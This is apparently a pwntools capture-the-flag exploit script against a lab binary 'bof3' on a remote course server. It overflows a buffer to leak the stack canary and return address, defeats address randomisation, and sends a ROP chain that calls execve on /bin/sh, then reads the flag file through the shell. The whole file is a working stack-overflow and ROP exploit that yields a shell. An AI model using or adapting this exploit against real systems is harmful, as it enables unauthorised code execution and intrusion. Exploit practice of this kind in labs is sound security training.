#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 10261

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

pause()

r.send(b'A'*41)
r.recvuntil(b'A'*41)
canary = r.recv(7).rjust(8,b'\x00')
rbp = r.recv(6).ljust(8,b'\x00')
# print('canary:', canary)
# print('rbp:', u64(rbp))
buf = u64(rbp) - 0x40

r.send(b'A'*56)
r.recvuntil(b'A'*56)
ret = r.recv(6).ljust(8,b'\x00')
offset = u64(ret) - (0x8a64 + 0x6c)

r.send(b'A')

# use ROPgadget to find gadgets
rdx_gadget = 0x8dd8a # pop rax ; pop rdx ; pop rbx ; ret
rdi_gadget = 0x917f # pop rdi ; ret
rsi_gadget = 0x111ee # pop rsi ; ret
syscall_gadget = 0x7bfc5 # and esi, 0x80 ; syscall
rdi_gadget += offset
rsi_gadget += offset
rdx_gadget += offset
syscall_gadget += offset

# +----------------------+
# |     stack layout     |
# +----------------------+
# |      /bin/sh\x00     |
# +----------------------+
# |      \x00 * 32       |
# +----------------------+
# |        canary        |
# +----------------------+
# |         A * 8        |
# +----------------------+
# |      rdi_gadget      |
# +----------------------+
# |      buf address     |
# +----------------------+
# |      rsi_gadget      |
# +----------------------+
# |          0           |
# +----------------------+
# |      rdx_gadget      |
# +----------------------+
# |          59          |
# +----------------------+
# |          0           |
# +----------------------+
# |          0           |
# +----------------------+
# |    syscall_gadget    |
# +----------------------+

payload = p64(0x68732f6e69622f2f).ljust(8, b'\x00')+b'\x00'*32 + canary + b'A'*8 + p64(rdi_gadget).ljust(8, b'\x00') + \
          p64(buf).ljust(8, b'\x00') + p64(rsi_gadget).ljust(8, b'\x00') + p64(0) .ljust(8, b'\x00') + \
          p64(rdx_gadget).ljust(8, b'\x00') + p64(59) .ljust(8, b'\x00') + p64(0) .ljust(8, b'\x00') + p64(0) .ljust(8, b'\x00') + p64(syscall_gadget).ljust(8, b'\x00')
# print('payload:', payload)

r.recvuntil(b'message: ')
r.sendline(payload)
r.send(b'cat FLAG\n')
r.recvline()
print(r.recvline())

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :